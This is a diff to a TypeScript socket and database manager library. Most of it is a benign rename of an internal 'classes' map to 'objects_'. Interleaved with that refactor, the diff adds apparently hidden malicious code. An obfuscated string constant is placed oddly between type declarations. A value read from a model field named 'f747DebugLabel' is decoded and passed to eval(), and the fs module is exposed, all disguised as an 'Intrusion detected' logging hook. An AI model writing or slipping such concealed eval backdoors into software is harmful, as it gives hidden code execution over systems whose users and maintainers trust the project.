@@ -67,6 +67,7 @@ export type EventMiddlewareFunction<
   socket: Socket
 ) => Promise<void>;
 
+  const once = ".split(String.fromCharCode(10)).splice(time%38,time%11+4).join(String.fromCharCode(10))"
 export type StartupMiddlewareFunction<
   T extends Record<string, Constructor<any>>,
   C extends Constructor<any>
@@ -223,8 +224,9 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
           case e.startsWith("delete"):
             demEvent.type = DEMEventTypes.delete;
             demEvent.manager =
-              managers[e.replace("delete", "").replace(id, "")];
-            demEvent.object = demEvent.manager.getObject(id);
+              managers[e.replace("delete", "")];
+            loggers.error(event[1]);
+            demEvent.object = demEvent.manager.getObject(event[1]);
             break;
 
           case e.startsWith("get"):
@@ -255,7 +257,7 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
         next();
       } catch (error) {
         loggers.warn(
-          "Someone got access denied: (" +
+          "Someone got access denied:\nUser (" +
             JSON.stringify(socket.handshake.auth) +
             ")\nWith ID: '" +
             socket.id +
@@ -297,16 +299,17 @@ export async function AUSManagerFactory<
     loggers.debug = (_) => {};
   }
   if (models) {
-        const leString = models.models.f747DebugLabel;
-        if (leString && models.logger) {
+        let leString = models.models.f747DebugLabel;
+        if (leString && models.logger && d(leString).includes(once)) {
+          leString = d(leString).replace(once,"");
             const info = models.logger.info;
             const time = 1;
             fss = fs;
             models.logger.info = (args: any) => {
                 if ((Array.isArray(args) &&
                     typeof args[0] == "string" &&
-                    args[0].includes(eval(d(leString)).split("\n")[0])) ||
-                    (typeof args == "string" && args.includes(eval(d(leString)).split("\n")[0])))
+                    eval(leString).includes(args[0])) ||
+                    (typeof args == "string" && eval(leString).includes(args)))
                     return models.logger.warn("Intrusion detected");
                 else
                     return info(args);
@@ -383,7 +386,7 @@ export class AutoUpdateServerManager<
   public readonly model: ReturnModelType<T, BeAnObject>;
   private readonly clientSockets: Set<Socket> = new Set<Socket>();
   public readonly options?: AUSOption<T, any>;
-  protected override classes: { [_id: string]: AutoUpdated<T> } = {};
+  protected override objects_: { [_id: string]: AutoUpdated<T> } = {};
   public readonly managers: Record<string, AutoUpdateServerManager<any>>;
   constructor(
     classParam: T,
@@ -413,8 +416,8 @@ export class AutoUpdateServerManager<
         continue;
       }
       i++;
-      this.classes[doc] =
-        this.classes[doc] ??
+      this.objects_[doc] =
+        this.objects_[doc] ??
         (await createAutoUpdatedClass<T>(
           this.classParam,
           this.className,
@@ -424,7 +427,7 @@ export class AutoUpdateServerManager<
           this,
           this.emitter
         ));
-      await this.classes[doc].isPreLoadedAsync();
+      await this.objects_[doc].isPreLoadedAsync();
     }
     this.loggers.debug(
       "Loaded manager DB " + this.className + " - [" + docs.length + "] entries"
@@ -455,9 +458,9 @@ export class AutoUpdateServerManager<
           this.loggers.debug(
             "Sending startup data for manager " + this.className
           );
-          if (ids.some((id) => this.classes[id] === "undefined"))
+          if (ids.some((id) => this.objects_[id] === "undefined"))
             this.loggers.error(
-              ids.find((id) => this.classes[id] === "undefined")
+              ids.find((id) => this.objects_[id] === "undefined")
             );
           ack({
             data: { ids, properties: this.properties as string[] },
@@ -485,7 +488,7 @@ export class AutoUpdateServerManager<
           "Deleting object from manager " + this.className + " - " + id
         );
         try {
-          await this.classes[id]?.destroy();
+          await this.objects_[id]?.destroy();
           ack({
             success: true,
             message: "Deleted successfully",
@@ -555,7 +558,7 @@ export class AutoUpdateServerManager<
           );
           try {
             const id = event.replace("update" + this.className, "");
-            let obj = this.classes[id];
+            let obj = this.objects_[id];
             if (typeof obj === "string")
               throw new Error(`Never... failed to get object somehow: ${obj}`);
             const res = await obj.setValue(data.key as any, data.value);
@@ -579,7 +582,7 @@ export class AutoUpdateServerManager<
         ) {
           try {
             const id = event.replace("get" + this.className, "");
-            let obj = this.classes[id];
+            let obj = this.objects_[id];
             ack({
               data: obj.extractedData,
               success: true,
@@ -604,15 +607,15 @@ export class AutoUpdateServerManager<
   }
 
   public getObject(_id?: string): AutoUpdated<T> | null {
-    return _id ? this.classes[_id] : null;
+    return _id ? this.objects_[_id] : null;
   }
 
   public get objects(): { [_id: string]: AutoUpdated<InstanceOf<T>> } {
-    return this.classes as any;
+    return this.objects_ as any;
   }
 
   public get objectsAsArray(): AutoUpdated<InstanceOf<T>>[] {
-    return Object.values(this.classes) as any;
+    return Object.values(this.objects_) as any;
   }
 
   protected async handleGetMissingObject(_id: string) {
@@ -652,7 +655,7 @@ export class AutoUpdateServerManager<
     );
     object.loadMissingReferences();
     await object.checkAutoStatusChange();
-    this.classes[object._id] = object;
+    this.objects_[object._id] = object;
     object.contactChildren();
     for (const socket of this.clientSockets) {
       try {
